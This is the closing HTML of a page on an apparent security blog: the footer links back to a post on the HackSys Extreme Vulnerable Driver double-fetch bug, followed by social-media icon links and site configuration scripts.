        <a href="../2022-05-21-HEVD3-DoubleFetch/" class="md-footer__link md-footer__link--prev" aria-label="Previous: HackSys Extreme Vulnerable Driver 3 - Double Fetch" rel="prev">
          <div class="md-footer__button md-icon">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
          </div>
          <div class="md-footer__title">
            <div class="md-ellipsis">
              <span class="md-footer__direction">
                Previous
              </span>
              HackSys Extreme Vulnerable Driver 3 - Double Fetch
            </div>
          </div>
        </a>
      
      
    </nav>
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs Insiders
    </a>
  
</div>
      
        <div class="md-social">
  
    
    
      
      
    
    <a href="https://twitter.com/linxzsec" target="_blank" rel="noopener" title="twitter.com" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg>
    </a>
  
    
    
      
      
    
    <a href="https://github.com/linxzsec" target="_blank" rel="noopener" title="github.com" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
    </a>
  
    
    
      
      
    
    <a href="https://gitlab.com/linxzsec" target="_blank" rel="noopener" title="gitlab.com" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="m503.5 204.6-.7-1.8-69.7-181.78c-1.4-3.57-3.9-6.59-7.2-8.64-2.4-1.55-5.1-2.515-8-2.81-2.9-.295-5.7.083-8.4 1.11-2.7 1.02-5.1 2.66-7.1 4.78-1.9 2.12-3.3 4.67-4.1 7.44l-47 144H160.8l-47.1-144c-.8-2.77-2.2-5.31-4.1-7.43-2-2.12-4.4-3.75-7.1-4.77a18.1 18.1 0 0 0-8.38-1.113 18.4 18.4 0 0 0-8.04 2.793 18.09 18.09 0 0 0-7.16 8.64L9.267 202.8l-.724 1.8a129.57 129.57 0 0 0-3.52 82c7.747 26.9 24.047 50.7 46.447 67.6l.27.2.59.4 105.97 79.5 52.6 39.7 32 24.2c3.7 1.9 8.3 4.3 13 4.3 4.7 0 9.3-2.4 13-4.3l32-24.2 52.6-39.7 106.7-79.9.3-.3c22.4-16.9 38.7-40.6 45.6-67.5 8.6-27 7.4-55.8-2.6-82z"/></svg>
    </a>
  
    
    
      
      
    
    <a href="https://keybase.io/linxz" target="_blank" rel="noopener" title="keybase.io" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M286.17 419a18 18 0 1 0 18 18 18 18 0 0 0-18-18zm111.92-147.6c-9.5-14.62-39.37-52.45-87.26-73.71q-9.1-4.06-18.38-7.27a78.43 78.43 0 0 0-47.88-104.13c-12.41-4.1-23.33-6-32.41-5.77-.6-2-1.89-11 9.4-35L198.66 32l-5.48 7.56c-8.69 12.06-16.92 23.55-24.34 34.89a51 51 0 0 0-8.29-1.25c-41.53-2.45-39-2.33-41.06-2.33-50.61 0-50.75 52.12-50.75 45.88l-2.36 36.68c-1.61 27 19.75 50.21 47.63 51.85l8.93.54a214 214 0 0 0-46.29 35.54C14 304.66 14 374 14 429.77v33.64l23.32-29.8a148.6 148.6 0 0 0 14.56 37.56c5.78 10.13 14.87 9.45 19.64 7.33 4.21-1.87 10-6.92 3.75-20.11a178.29 178.29 0 0 1-15.76-53.13l46.82-59.83-24.66 74.11c58.23-42.4 157.38-61.76 236.25-38.59 34.2 10.05 67.45.69 84.74-23.84.72-1 1.2-2.16 1.85-3.22a156.09 156.09 0 0 1 2.8 28.43c0 23.3-3.69 52.93-14.88 81.64-2.52 6.46 1.76 14.5 8.6 15.74 7.42 1.57 15.33-3.1 18.37-11.15C429 443 434 414 434 382.32c0-38.58-13-77.46-35.91-110.92zM142.37 128.58l-15.7-.93-1.39 21.79 13.13.78a93 93 0 0 0 .32 19.57l-22.38-1.34a12.28 12.28 0 0 1-11.76-12.79L107 119c1-12.17 13.87-11.27 13.26-11.32l29.11 1.73a144.35 144.35 0 0 0-7 19.17zm148.42 172.18a10.51 10.51 0 0 1-14.35-1.39l-9.68-11.49-34.42 27a8.09 8.09 0 0 1-11.13-1.08l-15.78-18.64a7.38 7.38 0 0 1 1.34-10.34l34.57-27.18-14.14-16.74-17.09 13.45a7.75 7.75 0 0 1-10.59-1s-3.72-4.42-3.8-4.53a7.38 7.38 0 0 1 1.37-10.34L214 225.19s-18.51-22-18.6-22.14a9.56 9.56 0 0 1 1.74-13.42 10.38 10.38 0 0 1 14.3 1.37l81.09 96.32a9.58 9.58 0 0 1-1.74 13.44zM187.44 419a18 18 0 1 0 18 18 18 18 0 0 0-18-18z"/></svg>
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    <script id="__config" type="application/json">{"base": "../../..", "features": ["header.autohide", "search.suggest", "search.highlight", "navigation.instant", "navigation.tracking", "navigation.tabs", "navigation.top", "content.code.annotate"], "search": "../../../assets/javascripts/workers/search.720157f5.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.config.lang": "en", "search.config.pipeline": "stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version.title": "Select version"}}</script>
    
    
      <script src="../../../assets/javascripts/bundle.4a0e3b6c.min.js"></script>
      
        <script src="../../../javascripts/mathjax.js"></script>
      
        <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
      
        <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
      
    
  </body>
</html>